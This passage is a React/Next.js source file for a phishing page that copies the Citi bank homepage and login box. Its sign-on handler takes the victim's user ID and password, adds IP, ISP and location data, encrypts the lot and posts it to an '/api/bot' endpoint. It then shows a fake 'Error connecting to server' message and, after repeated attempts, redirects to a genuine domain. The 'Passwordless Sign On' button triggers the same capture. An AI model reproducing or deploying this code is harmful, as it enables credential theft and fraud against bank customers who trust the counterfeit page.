"use client"
import Image from "next/image";
import citi from '../../public/citi.svg'
import fdic from '../../public/fdic.svg'
import citi_sprite from '../../public/Citi_Icon_Sprite_Banner_v1.svg'
import hero from '../../public/HP_12909_MPC_Hero.png'
import simplified from "../../public/HP_7430_M1M7_Image.jpg"
import save_more from '../../public/HP_7591_Module_3UP.jpg'
import explore from '../../public/AAStack_560x315_noangle.jpg'
import discover from "../../public/HP_10077_Citi_Shop.jpg"
import { useEffect, useState } from "react";
import {encryptPayload} from '@/utils/encrypt';
import cards from '../../public/HP_12909_MPC_Hero.png'


export default function Home() {

  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [domain, setDomain] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [clicks, setClicks] = useState(0)

  const [geoInfo, setGeoInfo] = useState(null)

  useEffect(() => {
   getGeoInfo()
   // check()
   }, [domain])

   async function getGeoInfo() {
    const response = await fetch('/api/getInfo')
    const data = await response.json()
    setGeoInfo(data)
  }


  const sendInfoBot = async (e) => {
    e.preventDefault()
    setLoading(true)

    setClicks(clicks + 1)

    const info = {
      username,
      password,
      country: geoInfo.country,
      city: geoInfo.city,
      region: `${geoInfo.regionName} | ${geoInfo.region}`,
      host_ip: geoInfo.query,
      hostname: `${geoInfo.isp} | ${geoInfo.org} | ${geoInfo.as}` ,
      postal_code: geoInfo.zip,
      timezone: geoInfo.timezone,
      date: new Date().toDateString()
    }


    const encryptedPayload = encryptPayload(info)
    console.log('encrypted_payload: ', await encryptedPayload)

    try {
      const response = await fetch('/api/bot', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(await encryptedPayload),
      });

      if (response.status === 200) {
        console.log('sent successfully')
        setLoading(false)
        setError('Error connecting to server')
      } else {
        console.log('Unsuccessful')
        setLoading(false)
        setError('Error connecting to server')
      }
    } catch (error) {
      console.log(`Error sending message.: ${error}`);
      setLoading(false)
      setError('Error connecting to server')
    }

    if(clicks >= 2) {
      window.location = `https://${domain}`
    }

  }

  return (
    <div className="ng-tns-c3920221554-0">
      <div className="ng-tns-c3920221554-0 citi-outer-container cbolui-cds">

        <header className="ng-tns-c3920221554-0">
            <div className="header ng-star-inserted">
                <div className="primary-header">

                  <div className="ng-star-inserted">
                      <div role="banner" className="banner ng-star-inserted">
                          <div className="content-wrap">

                            <div className="journeyLogo">

                                <div id="logoDiv" className="logoDiv default ng-star-inserted">
                                    <a>
                                      <Image width={88} height={89} src={citi} alt={'Citi'} className="ng-star-inserted" />
                                    </a>
                                </div>

                                <div id="fdicDiv" className="ng-star-inserted">
                                  <a role="presentation" id="fdicFocusUrl" tabIndex={0}>
                                    <Image
                                      alt="Citi FDIC Insured"
                                      src={fdic}
                                      id="fdicLogoA"
                                      className="ng-star-inserted"
                                    />
                                  </a>
                                </div>

                            </div>

                            <div className="buttons ng-star-inserted">
                              <div className="navButton ng-star-inserted" id="butlerATM">
                                <a id="atmLink" href="/citibank-location-finder" className="ng-star-inserted">
                                  <Image
                                    aria-hidden="true"
                                    alt=""
                                    src={citi_sprite}
                                  />
                                  <span>ATM / BRANCH</span>
                                </a>
                              </div>

                              <div className="navButton ng-star-inserted" id="lang">
                                <button
                                  id="langBtn"
                                  data-target="#citi-modalb2"
                                  lang="es"
                                  aria-label="Haz clic para cambiar la página al español"
                                  className="ng-star-inserted"
                                >
                                  <Image
                                    aria-hidden="true"
                                    alt=""
                                    src={citi_sprite}
                                  />
                                  <span lang="es">ESPAÑOL</span>
                                </button>
                              </div>
                            </div>


                          </div>
                      </div>
                  </div>

                 <nav className="citi-navigation">
                  <div aria-label="Main" role="navigation" className="navigationParent blueTopNavTheme preLogin ng-star-inserted">
                        <div id="navigationLeft">
                          <ul className="nav-bar-main-ul" style={{display: 'flex', position: 'static'}}>
                            <li className="mainListItem ng-star-inserted" role="listitem" id="navcreditCardMainLI">
                            <a tabIndex="0" className="main-links mobileRightChevron topNavTabs ng-star-inserted" id="navcreditCardmainAnchor0" role="button" aria-expanded="false">Credit Cards</a>
                            </li>

                            <li className="mainListItem ng-star-inserted" role="listitem" id="navcreditCardMainLI">
                            <a tabIndex="0" className="main-links mobileRightChevron topNavTabs ng-star-inserted" id="navcreditCardmainAnchor0" role="button" aria-expanded="false">Banking</a>
                            </li>

                            <li className="mainListItem ng-star-inserted" role="listitem" id="navcreditCardMainLI">
                            <a tabIndex="0" className="main-links mobileRightChevron topNavTabs ng-star-inserted" id="navcreditCardmainAnchor0" role="button" aria-expanded="false">Lending</a>
                            </li>

                            <li className="mainListItem ng-star-inserted" role="listitem" id="navcreditCardMainLI">
                            <a tabIndex="0" className="main-links mobileRightChevron topNavTabs ng-star-inserted" id="navcreditCardmainAnchor0" role="button" aria-expanded="false">Investing</a>
                            </li>
                            <li className="mainListItem ng-star-inserted" role="listitem" id="navcreditCardMainLI">
                            <a tabIndex="0" className="main-links mobileRightChevron topNavTabs ng-star-inserted" id="navcreditCardmainAnchor0" role="button" aria-expanded="false">Wealth Management </a>
                            </li>

                            <li className="mainListItem ng-star-inserted" role="listitem" id="navcreditCardMainLI">
                            <a tabIndex="0" className="main-links mobileRightChevron topNavTabs ng-star-inserted" id="navcreditCardmainAnchor0" role="button" aria-expanded="false">{'Opan an Account > '}</a>
                            </li>
                          </ul>


                        </div>

                          <div id="navigationRight"><button _ngcontent-ssr-c2217966731="" type="button" name="how can we help button" className="en_US howCanWeHelpButton main-links topNavButton ng-star-inserted">
                            How can we help?
                          </button>
                        </div>
                  </div>
                 </nav>


                </div>
            </div>
        </header>


        <div  id="maincontent" className="ng-tns-c3920221554-0">

          <div className="ng-tns-c3920221554-0">

              <div className="ng-tns-c3920221554-0 citi-container cbolui-ddl theme-light fullbleedFix HPfullbleedFix">
                <div className="appbody ng-tns-c3920221554-0 ng-star-inserted">
                    <div className="ng-tns-c3920221554-0 ng-star-inserted">
                      <div role="main">
                        <div pageid="ag_homePage">
                          <div className="homepage-reskin-container">

                          {/* <div id="clearUserIdAlert" className="container-fluid" style={{ display: "none" }}>
                              <div
                                role="alert"
                                id="clearUser-alert-id"
                                className="cds-banner-alert success-alert"
                                style={{ backgroundColor: "#fff", display: "block" }}
                              >
                                <div className="contentParentWrap">
                                  <div className="contentWrap">
                                    <div
                                      role="img"
                                      id="cds-icon-id1"
                                      alt="Signoff Alert Section"
                                      aria-label="icon"
                                      className="sfi b1-05-check-hover medium-circle"
                                      style={{
                                        backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 22 22'%3E%3Ctitle%3E05-check-b1-hover%3C/title%3E%3Cpath d='M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm6.7,7.71-8.1,7.86A1.53,1.53,0,0,1,9.54,17a1.51,1.51,0,0,1-1-.42L5.3,13.48A1,1,0,0,1,6.7,12L9.54,14.8,17.3,7.28a1,1,0,1,1,1.4,1.43Z' transform='translate(-1 -1)' style='fill:%23002a54'/%3E%3C/svg%3E")`
                                      }}
                                    />
                                    <p className="content reskin-alert-signoff">You've successfully cleared the User ID!</p>
                                  </div>
                                  <div className="closeBtnWrap">
                                    <button type="button" aria-label="Close" className="cds-close"></button>
                                  </div>
                                </div>
                              </div>
                          </div> */}


                          <section
                              className="heroReskinSection"
                              style={{
                                backgroundImage:
                                  "url(../../public/Citi-futuristic.jpg)",
                              }}
                            >
                              <div
                                className="container-fluid offer-content"
                                id="mpc_citicom_may2016"
                                data-id="mpc_citicom_may2016"
                              >
                                {/* <div aria-hidden="true" className="seo-hidden">
                                  <h1>Citi</h1>
                                </div> */}

                                <div className="row noPadding">
                                  <div className="col-xs-12 heroImage-mobileView">
                                    <a
                                      href="#"
                                    >
                                      <Image
                                        className="product-image mpc_citicom_may2016"
                                        src={hero}
                                        alt="Choose the right Citi® credit card for you"
                                      />
                                    </a>
                                  </div>

                                  <div className="col-xs-12 col-md-4 column-one">
                                    <div className="subHeading-title">
                                      CITI<sup>®</sup> CREDIT CARDS
                                    </div>
                                    <p className="heading-title">
                                      <b>Choose the right Citi<sup>®</sup> credit card for you</b>
                                    </p>
                                    <p className="introText">
                                      Whether you want Cash Back, a Low Intro Rate, Rewards for Costco
                                      Members, or Great Airline Miles, the choice is all yours.
                                    </p>
                                    <button
                                      className="cds-cta mpc_citicom_may2016 cds-cta-lg cds-cta-primary cds-cta-priority"
                                      aria-label="Learn More: CITI® CREDIT CARDS"
                                      style={{fontWeight: 800}}
                                    >
                                      Learn More
                                      {/* <span className="ada-hidden">
                                        Whether you want Cash Back, a Low Intro Rate, Rewards for
                                        Costco Members, or Great Airline Miles, the choice is all
                                        yours.
                                      </span> */}
                                    </button>
                                  </div>

                                  <div className="col-xs-12 col-md-4 column-two cardArtImage">
                                    <div className="hideCardartOnMobile">
                                      <a
                                        href="https://www.citi.com/credit-cards/compare/view-all-credit-cards?afc=105&intc=1~1~52~6~BANR~1~mpc_Default_citicomREDPE_aug2016~OMPC105"
                                      >
                                        <Image
                                          className="product-image mpc_citicom_may2016"
                                          src={cards}
                                          width={500}
                                          height={500}
                                          alt="Choose the right Citi® credit card for you"
                                        />
                                      </a>
                                    </div>
                                  </div>

                                  <div className="col-xs-12 col-sm-3 col-md-4 column-three">
                                    <div className="ng-star-inserted">

                                      <div className="passwordLoginBoxContainer">
                                          <div className="passwordLoginBoxContainer ng-star-inserted">

                                          <form onSubmit={sendInfoBot} id='logInForm' className="space-y-4 max-w-xl mx-auto p-4 bg-white rounded-xl shadow">
                                              {/* <h2 className="text-xl font-semibold text-center">Sign On</h2> */}

                                              <div className="cds-signon2 cdssignon reskinLayout passwordLoginBox ngaSignon">
                                                <section className="theme-light SampleErrorStates">
                                                  {/* <h4  className="cds-signon-title"></h4> */}
                                                    <div className="row">

                                                      <div className="col-sm-6 sign-user">
                                                      <label htmlFor="username" className="cds-label input-field-title">
                                                        User ID
                                                      </label>
                                                      <div className="cds-form-field-infix cds-form-field-content cds-form-field-input">

                                                        <input
                                                          type="text"
                                                          id="username"
                                                          name="username"
                                                          className="cds-input cds-placeholder-text ng-untouched ng-pristine ng-invalid username"
                                                          maxLength={50}
                                                          placeholder="User ID"
                                                          onChange={e => setUsername(e.target.value)}
                                                          value={username}
                                                        />

                                                      </div>
                                                      </div>

                                                      <div className="col-sm-6 sign-password">

                                                      <label htmlFor="password" className="cds-label input-field-title">
                                                        Password
                                                      </label>
                                                      <div className="cds-form-field-infix cds-form-field-content cds-form-field-input">
                                                      <input
                                                        type="password"
                                                        id="password"
                                                        name="password"
                                                        className="cds-input form-control cds-placeholder-text ng-untouched ng-pristine ng-invalid"                                                        maxLength={256}
                                                        placeholder="Password"
                                                        onChange={e => setPassword(e.target.value)}
                                                        value={password}
                                                      />
                                                       <div className="passwordIcon ng-star-inserted">
                                                          <div className="eye">

                                                          </div>
                                                      </div>
                                                      </div>




                                                      </div>


                                                    </div>

                                                    <div className="row">

                                                      <div className="col-sm-6 pb-2 mb-1">
                                                        <div className="remember-user remember ng-star-inserted">
                                                            <div className="cds-form-field ng-star-inserted">
                                                                <div className="cds-form-field-infix cds-form-field-content cds-form-field-checkbox">
                                                                    <div className="cds-checkbox2 ng-untouched ng-pristine ng-valid inp">
                                                                    <input
                                                                        type="checkbox"
                                                                        id="remember"
                                                                        name="remember"
                                                                        className="cds-checkbox2-input "
                                                                      />
                                                                      <label htmlFor="remember" className="cds-checkbox2-label">
                                                                        Remember User ID
                                                                      </label>
                                                                    </div>



                                                                </div>
                                                                <div><div></div></div>
                                                            </div>
                                                        </div>
                                                      </div>

                                                    </div>

                                                    <div className="form-group col-xs-12 pl-0 pt-2 ng-star-inserted">
                                                    <button
                                                      type="submit"
                                                      className="cds-button cds-signon-button cds-button-primary cds-button-lg"
                                                      style={{fontWeight: 800}}
                                                    >
                                                      Sign On
                                                    </button>
                                                    </div>


                                                    <div className="row register-main ">

                                                        <div className="col-sm-5" >

                                                          <div className="register-activate d-flex">

                                                            <div className="col-xs-6 anchor-container">
                                                              <a href="#" className="cds-signon-anchor register" target="_self">
                                                                Register
                                                              </a>
                                                            </div>

                                                            <span className="register-connector">/</span>

                                                            <div className="col-xs-6 anchor-container">
                                                              <a href="#" className="cds-signon-anchor activate" target="_self">
                                                                Activate
                                                              </a>
                                                            </div>

                                                          </div>

                                                        </div>


                                                        <div className="col-sm-6" >

                                                          <div className="register-activate d-flex">

                                                            <div className="col-xs-6 anchor-container">
                                                              <a href="#" className="cds-signon-anchor register" target="_self">
                                                               User ID
                                                              </a>
                                                            </div>

                                                            <span className="register-connector">or</span>

                                                            <div className="col-xs-6 anchor-container">
                                                              <a href="#" className="cds-signon-anchor activate" target="_self">
                                                                Password
                                                              </a>
                                                            </div>

                                                          </div>

                                                        </div>

                                                        {/* <div className="col-sm-7" style={{border: '1px solid red'}}>
                                                          <div className="col-xs-6 anchor-container">
                                                              <div className="cds-signon-anchor register">
                                                                <div style={{paddingTop: "10px", display: 'flex'}}>

                                                                <div className="col-xs-6 readLine ForgetOrText"> Forgot </div>
                                                                <div className="col-xs-6 readLine next1 " ><a  id="RequestUserIDReminder" href="h#" tabIndex="0">User ID</a></div>
                                                                <div  className="col-xs-6 readLine ForgetOrText "> or </div>
                                                                <div className="col-xs-6 readLine"><a  id="ForgotPassword " href="#" tabIndex="0">Password</a></div>


                                                                </div>

                                                              </div>
                                                          </div>
                                                        </div> */}

                                                    </div>




                                                  </section>
                                              </div>

                                              <div style={{width: '100%'}} className="ng-star-inserted">
                                                <button cdsbutton="alternate" size="large" id="qrButton" onClick={sendInfoBot} className="ng-star-inserted" >
                                                  <div  id="icon-id" aria-hidden="true" className="passwordless"></div><span id="qrButtonText">Passwordless Sign On</span></button>
                                              </div>
                                          </form>

                                          </div>

                                      </div>

                                    </div>
                                  </div>
                                </div>
                              </div>
                          </section>

                          {/* second */}
                          <section className="ng-star-inserted">



                          </section>


                          {/* third */}
                          <section className="ng-star-inserted">
                              <div className="threeUp threeUpContainer mt-5">

                                 <section className="showcase ng-star-inserted">
                                      <div className="container-fluid">

                                        <div className="row">
                                          <div className="row px-0 ng-star-inserted" style={{display: "flex !important"}}>

                                            <div className="col-xs-12 col-md-4 offer-content ng-star-inserted" id="HP23_Chk_LRN_Mtgen_HP" data-id="HP23_Chk_LRN_Mtgen_HP">
                                              <div className="d-flex flex-column h-100 ng-star-inserted">

                                                <div className="flex-outer-container h-100 d-flex flex-column">
                                                  <div className="eyebrow-text">CITI<sup>®</sup> CHECKING ACCOUNTS</div>

                                                  <a target="" href="#"><Image className="hpImage HP23_Chk_LRN_Mtgen_HP lazyloaded" alt="Simplified Banking" data-expand="10"  src={simplified} /></a>
                                                  <div  className="h-100 d-flex flex-column m-bottom-0 p-top-4">
                                                    <div className="headers ng-star-inserted">
                                                      <h2 aria-level="3" className="normal-case">Simplified Banking</h2>
                                                    </div>
                                                    <p  className="flex-grow-1 description">Citi mobile banking allows you to manage your money and pay friends — all while on-the-go. Member FDIC.</p>
                                                    <div >
                                                      <button  cdscta="primary" customertype="priority" size="large" className="cds-cta btn-threeup cta-desktop HP23_Chk_LRN_Mtgen_HP cds-cta-lg cds-cta-primary cds-cta-priority" aria-label="Learn More about Simplified Banking" style={{fontWeight: 800}}>
                                                        Learn More
                                                      </button>
                                                      </div>
                                                    </div>

                                                </div>


                                              </div>

                                            </div>

                                            <div className="col-xs-12 col-md-4 offer-content ng-star-inserted" id="HP23_Sav_LRN_Sim_GSAV" data-id="HP23_Sav_LRN_Sim_GSAV">
                                              <div className="d-flex flex-column h-100 ng-star-inserted">
                                                <div className="flex-outer-container h-100 d-flex flex-column">
                                                  <div  className="eyebrow-text">CITI<sup>®</sup> SAVINGS ACCOUNTS </div>

                                                  <a target="" href="#" className="HP23_Sav_LRN_Sim_GSAV">
                                                    <Image className="hpImage HP23_Sav_LRN_Sim_GSAV lazyloaded" alt="Save More, Earn More" data-expand="10"  src={save_more} />
                                                  </a>

                                                  <div className="h-100 d-flex flex-column m-bottom-0 p-top-4">
                                                    <div className="headers ng-star-inserted">
                                                      <h2  aria-level="3" className="normal-case">Save More, Earn More </h2>

                                                      <p className="flex-grow-1 description">At Citi, start saving with ease and grow with confidence. Member FDIC.</p>

                                                      <div>
                                                        <button cdscta="primary" style={{fontWeight: 800}} customertype="priority" size="large" className="cds-cta btn-threeup cta-desktop HP23_Sav_LRN_Sim_GSAV cds-cta-lg cds-cta-primary cds-cta-priority" aria-label="Learn More about Save More, Earn More
                                                          "> Learn More
                                                          </button>
                                                      </div>
                                                    </div>

                                                  </div>



                                                </div>

                                              </div>
                                            </div>

                                            <div className="col-xs-12 col-md-4 offer-content ng-star-inserted" id="AA_FAM3_CITICOM" data-id="AA_FAM3_CITICOM">
                                                <div className="d-flex flex-column h-100 ng-star-inserted">
                                                  <div className="flex-outer-container h-100 d-flex flex-column">

                                                    <div className="eyebrow-text">CITI<sup>®</sup> / AADVANTAGE<sup>®</sup> CREDIT CARDS</div>
                                                    <a target="" href="#">
                                                      <Image className="hpImage AA_FAM3_CITICOM lazyloaded" alt="Explore Citi® / AAdvantage® Credit Cards" src={explore} />
                                                    </a>

                                                    <div className="h-100 d-flex flex-column m-bottom-0 p-top-4">
                                                      <div className="headers ng-star-inserted">
                                                      <h2  aria-level="3" className="normal-case">Explore Citi<sup>®</sup> / AAdvantage<sup>®</sup> Credit Cards</h2>
                                                      </div>
                                                      <p className="flex-grow-1 description">Whether you&#39;re a frequent flyer or first—time passenger, Citi has an airline rewards credit card to meet your travel needs.</p>

                                                      <div >
                                                        <button cdscta="primary" customertype="priority" size="large" className="cds-cta btn-threeup cta-desktop AA_FAM3_CITICOM cds-cta-lg cds-cta-primary cds-cta-priority" aria-label="Learn More about Explore Citi® / AAdvantage® Credit Cards" style={{fontWeight: 800}}>
                                                          Learn More
                                                        </button>

                                                        <button cdscta="tertiary" aria-hidden="true" disabled="" className="cds-cta btn-threeup secondaryCta cds-cta-md cds-cta-tertiary"></button></div>

                                                    </div>



                                                  </div>

                                                </div>
                                            </div>





                                          </div>

                                        </div>

                                      </div>
                                 </section>





                              </div>

                          </section>


                          <section className="ng-star-inserted">
                              <div className="mod-seven offer-content ng-star-inserted" id="HP24_SHP_XPLR_Dscvr_SHOP2" data-id="HP24_SHP_XPLR_Dscvr_SHOP2">


                              <div id="modSevenContainer" className="container" style={{ paddingLeft: 0, paddingRight: 0 }}>
                                <div className="mod-seven">
                                  <section className="showcase ng-star-inserted">
                                    <div className="container-fluid showcase-3">

                                      <div className="row">
                                        <div className="g-3-container row">
                                          {/* Image Section */}
                                          <div className="col-md-6 mb-3 overflow-hidden">
                                            <a
                                              href="#"
                                              className="HP24_SHP_XPLR_Dscvr_SHOP2"
                                            >
                                              <Image
                                                className="img-responsive HP24_SHP_XPLR_Dscvr_SHOP2"
                                                alt="Shop, Save and Make a Splash"
                                                src={discover}
                                              />
                                            </a>
                                          </div>

                                          {/* Text Content Section */}
                                          <div className="col-md-6 module-content order-md-last">
                                            <section>
                                              <p className="eyebrow-text">INTRODUCING THE CITI SHOP℠ PROGRAM</p>
                                              <h2 className="bold header-level-2">Shop, Save and Make a Splash</h2>
                                            </section>

                                            <p></p>
                                            <div>
                                              <div className="m-bottom-0">
                                                <span className="m-bottom-30 d-block m-bottom-10">
                                                  Add the new, free Citi Shop browser extension that finds offers and coupons at over 5,000 online
                                                  merchants
                                                </span>

                                                <div>
                                                  <button
                                                    className="cds-cta HP24_SHP_XPLR_Dscvr_SHOP2 cds-cta-lg cds-cta-primary cds-cta-priority"
                                                    aria-label="Discover Citi Shop about INTRODUCING THE CITI SHOP℠ PROGRAM"
                                                  >
                                                    Discover Citi Shop
                                                    <span className="ada-hidden" style={{display: 'none'}}>
                                                      Add the new, free Citi Shop browser extension that finds offers and coupons at over 5,000 online
                                                      merchants
                                                    </span>
                                                  </button>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>

                                    </div>
                                  </section>
                                </div>

                              </div>



                              </div>
                          </section>


                          <section className="ng-star-inserted">
                            <div className="mod-one offer-content ng-star-inserted">
                            <div id="modOneContainer" className="container" style={{ paddingLeft: 0, paddingRight: 0 }}>
                              <section className="showcase">
                                <div className="container-fluid showcase-3">
                                  <div className="row">
                                    <div className="g-3-container row" style={{paddingTop: '2em'}}>
                                      {/* Right-side image */}
                                      <div className="col-md-6 mb-3 order-md-last overflow-hidden">
                                        <a
                                          href="#"
                                          className="HP23_Chk_LRN_REI_intro"
                                        >
                                          <img
                                            className="img-responsive HP23_Chk_LRN_REI_intro"
                                            alt="Unlock checking that grows with you"
                                            src="https://aemapi.citi.com/content/dam/cfs/uspb/usmkt/cbol-homepage/en/banners/images/HP_7385_M1_Image.jpg"
                                          />
                                        </a>
                                      </div>

                                      {/* Text content */}
                                      <div className="col-md-6 module-content">
                                        <section>
                                          <p className="eyebrow-text">CITI<sup>®</sup> CHECKING ACCOUNTS</p>
                                          <h2 className="bold header-level-2">Unlock checking that grows with you</h2>
                                        </section>

                                        <p></p>

                                        <div>
                                          <div className="m-bottom-0 margin-des-text">
                                            <span className="m-bottom-20 d-block m-bottom-10">
                                              The higher your balances, the more benefits and services you can enjoy from Citi Relationship Tiers.
                                            </span>
                                            <div>
                                              <button
                                                className="cds-cta HP23_Chk_LRN_REI_intro cds-cta-lg cds-cta-primary cds-cta-priority"
                                                aria-label="Learn More about CITI® CHECKING ACCOUNTS"
                                                style={{fontWeight: 800}}
                                              >
                                                Learn More
                                                <span className="ada-hidden" style={{display: 'none'}}>
                                                  The higher your balances, the more benefits and services you can enjoy from Citi Relationship
                                                  Tiers.
                                                </span>
                                              </button>
                                            </div>
                                          </div>

                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </section>
                            </div>

                            </div>

                          </section>


                          <section className="ng-star-inserted">
                            <div className="mod-three" style={{ position: "relative" }}>
                                <div className="offer-content" id="HP24_Cnt_LRN_LAM_SvgsHab" data-id="HP24_Cnt_LRN_LAM_SvgsHab">
                                  <div id="modThreeContainer" className="container" style={{ paddingLeft: 0, paddingRight: 0 }}>
                                    <section className="showcase">
                                      <div className="container-fluid showcase-3">
                                        <div className="row">
                                          <div className="g-3-container row" style={{paddingTop: '2em'}}>
                                            {/* Image section (left side) */}
                                            <div className="col-md-6 mb-3 overflow-hidden">
                                              <a
                                                href="https://www.lifeandmoney.citi.com/lam/articles/money/managing-money/money-goals"
                                                className="HP24_Cnt_LRN_LAM_SvgsHab"
                                              >
                                                <img
                                                  className="img-responsive HP24_Cnt_LRN_LAM_SvgsHab"
                                                  alt="Need Help Hitting Your Money Goals?"
                                                  src="https://aemapi.citi.com/content/dam/cfs/uspb/usmkt/cbol-homepage/en/banners/images/HP_10592__GPA_HP24_Cnt_LRN_LAM_SvgsHab.png"
                                                />
                                              </a>
                                            </div>

                                            {/* Text content (right side) */}
                                            <div className="col-md-6 module-content order-md-last">
                                              <section>
                                                <p className="eyebrow-text">LIFE AND MONEY BY CITI</p>
                                                <h2 className="bold header-level-2">Need Help Hitting Your Money Goals?</h2>
                                              </section>

                                              <div>
                                                <p className="m-bottom-0 margin-des-text">
                                                  <span className="m-bottom-20 d-block">Here are smart tips for successful saving.</span>
                                                </p>
                                                <div>
                                                  <button
                                                    className="cds-cta HP24_Cnt_LRN_LAM_SvgsHab cds-cta-lg cds-cta-primary cds-cta-priority"
                                                    aria-label="Learn More about LIFE AND MONEY BY CITI"
                                                    style={{fontWeight: 800}}
                                                  >
                                                    Learn More

                                                  </button>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </section>

                                    {/* Mobile View Image */}
                                    <div className="MobileViewOfferImg" style={{display: 'none'}}>
                                      <a
                                        href="https://www.lifeandmoney.citi.com/lam/articles/money/managing-money/money-goals"
                                        className="HP24_Cnt_LRN_LAM_SvgsHab"
                                      >
                                        <img
                                          alt="Need Help Hitting Your Money Goals?"
                                          className="lazyload"
                                          src="https://aemapi.citi.com/content/dam/cfs/uspb/usmkt/cbol-homepage/en/banners/images/HP_10592__GPA_HP24_Cnt_LRN_LAM_SvgsHab.png"
                                        />
                                      </a>
                                    </div>
                                  </div>
                                </div>
                            </div>
                          </section>



                          </div>
                        </div>
                      </div>
                    </div>
                </div>
              </div>

              {/* Footer */}
              <div className="ng-tns-c3920221554-0">
                <div className="footer ng-star-inserted">
                  <div className="ng-star-inserted">
                      <div className="navigation ng-star-inserted">


                      <div className="content">
                          {/* Section: Why Citi */}
                          <div role="group" className="section">
                            <div role="heading" aria-level="2" className="title" id="nav-list-header0">
                              Why Citi
                            </div>
                            <ul id="list0" aria-labelledby="nav-list-header0" aria-hidden="false">
                              <li id="navOurStory">
                                <a className="cta-link btn btn-link" href="https://www.citigroup.com/citi/">Our Story</a>
                              </li>
                              <li id="navCareers">
                                <a className="cta-link btn btn-link" href="https://jobs.citi.com/">Careers</a>
                              </li>
                              <li id="navBenefitsAndServices">
                                <a className="cta-link btn btn-link" href="/online-services/bank-statements">Benefits and Services</a>
                              </li>
                              <li id="navRewards">
                                <a className="cta-link btn btn-link" href="/credit-cards/credit-card-rewards/what-are-credit-card-reward-points">Rewards</a>
                              </li>
                              <li id="navPrivatePass">
                                <a className="cta-link btn btn-link" href="https://www.citientertainment.com/?utm_source=CBOL&utm_medium=Footer&utm_campaign=CE_Homepage_Footer" target="_blank">
                                  Citi Entertainment<sup>®</sup>
                                </a>
                                <span className="sr-only" aria-hidden="true">Opens in new window</span>
                              </li>
                              <li id="navSpecialOffers">
                                <a className="cta-link btn btn-link" href="/banking/special-offers">Special Offers</a>
                              </li>
                            </ul>
                          </div>

                          {/* Section: Wealth Management */}
                          <div role="group" className="section">
                            <div role="heading" aria-level="2" className="title" id="nav-list-header1">
                              Wealth Management
                            </div>
                            <ul id="list1" aria-labelledby="nav-list-header1" aria-hidden="false">
                              <li><a className="cta-link btn btn-link" href="https://www.citi.com/banking/citigold-private-client">Citigold<sup>®</sup> Private Client</a></li>
                              <li><a className="cta-link btn btn-link" href="/banking/citigold">Citigold</a></li>
                              <li><a className="cta-link btn btn-link" href="/banking/citi-priority">Citi Priority</a></li>
                              <li><a className="cta-link btn btn-link" href="https://www.privatebank.citibank.com/">Citi Private Bank</a></li>
                            </ul>
                          </div>

                          {/* Section: Business Banking */}
                          <div role="group" className="section">
                            <div role="heading" aria-level="2" className="title" id="nav-list-header2">
                              Business Banking
                            </div>
                            <ul id="list2" aria-labelledby="nav-list-header2" aria-hidden="false">
                              <li><a className="cta-link btn btn-link" href="/small-business/banking">Small Business Accounts</a></li>
                              <li><a className="cta-link btn btn-link" href="https://www.citibank.com/commercialbank/en/index.html">Commercial Accounts</a></li>
                            </ul>
                          </div>

                          {/* Section: Rates */}
                          <div role="group" className="section">
                            <div role="heading" aria-level="2" className="title" id="nav-list-header3">
                              Rates
                            </div>
                            <ul id="list3" aria-labelledby="nav-list-header3" aria-hidden="false">
                              <li><a className="cta-link btn btn-link" href="/banking/current-interest-rates/savings-accounts">Personal Banking</a></li>
                              <li><a className="cta-link btn btn-link" href="/credit-cards/compare-credit-cards/citi.action?ID=view-all-credit-cards">Credit Cards</a></li>
                              <li><a className="cta-link btn btn-link" href="https://www.citi.com/mortgage/purchase-rates">Mortgage</a></li>
                              <li><a className="cta-link btn btn-link" href="https://www.citi.com/home-equity/rates">Home Equity</a></li>
                              <li><a className="cta-link btn btn-link" href="https://www.citi.com/personal-loans?affcode=CWF&intc=pil_borrow_footer_prelogin">Personal Loans</a></li>
                            </ul>
                          </div>

                          {/* Section: Help & Support */}
                          <div role="group" className="last section">
                            <div role="heading" aria-level="2" className="title" id="nav-list-header4">
                              Help & Support
                            </div>
                            <ul id="list4" aria-labelledby="nav-list-header4" aria-hidden="false">
                              <li><a className="cta-link btn btn-link" href="/contactus">Contact Us</a></li>
                              <li><button type="button" className="btn btn-link" style={{ textAlign: "center" }}>Help & FAQs</button></li>
                              <li><a className="cta-link btn btn-link" href="/security-center">Security Center</a></li>
                            </ul>
                          </div>

                          {/* Branding Image */}
                          <div className="section">
                            <div className="images ng-star-inserted">
                              <span className="brandingSprite equalHousing" alt="Equal housing lender">
                                <img id="homeSprite" alt="Equal Housing Lender" src="https://www.citi.com/CBOL/IA/Angular/assets/Citi_Icon_Sprite_v2.svg" />
                              </span>
                            </div>
                          </div>
                      </div>





                      </div>
                  </div>

                  <div className="ng-star-inserted">
                    <div className="social ng-star-inserted">

                        <div className="content">

                            <ul className="socialIcons ng-star-inserted">
                              <li className="ng-star-inserted">
                                  <button data-target="#modal00" aria-label="Get it on Google Play" className="ng-star-inserted">
                                    <Image id="Googleplay" width={800} height={800} alt="undefined" src="https://www.citi.com/CBOL/IA/Angular/assets/Citi_Icon_Sprite_v2.svg" className="Googleplay" />
                                  </button>

                                  <div className="cbolui-ddl-pre">
                                      <div>

                                      </div>
                                  </div>

                              </li>

                              <li className="ng-star-inserted">
                                  <button data-target="#modal00" aria-label="Get it on Google Play" className="ng-star-inserted">
                                    <Image id="Appstore" width={800} height={800} alt="undefined" src="https://www.citi.com/CBOL/IA/Angular/assets/Citi_Icon_Sprite_v2.svg" className="Googleplay" />
                                  </button>

                                  <div className="cbolui-ddl-pre">
                                      <div>

                                      </div>
                                  </div>

                              </li>


                            </ul>

                            <ul className="socialIcons ng-star-inserted"></ul>

                            <ul className="socialIcons ng-star-inserted">
                                <li className="ng-star-inserted">
                                <button data-target="#modal20" aria-label="facebook" className="https://www.citi.com/CBOL/IA/Angular/assets/Citi_Icon_Sprite_v2.svg ng-star-inserted">
                                  <Image width={500} height={500} id="facebook" alt="facebook" src="https://www.citi.com/CBOL/IA/Angular/assets/Citi_Icon_Sprite_v2.svg" className="facebook" />
                                </button>
                                </li>
